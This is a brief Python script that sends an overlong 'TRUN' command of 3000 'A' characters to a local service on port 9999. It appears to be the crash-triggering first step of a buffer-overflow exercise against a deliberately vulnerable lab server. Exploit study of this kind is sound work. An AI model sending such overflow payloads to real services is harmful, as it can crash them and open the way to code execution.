import socket

characters = 'A' * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
s.recv(100)
s.send('TRUN .' + characters)
print s.recv(100)
s.send('EXIT\r\n')
print s.recv(100)
s.close()
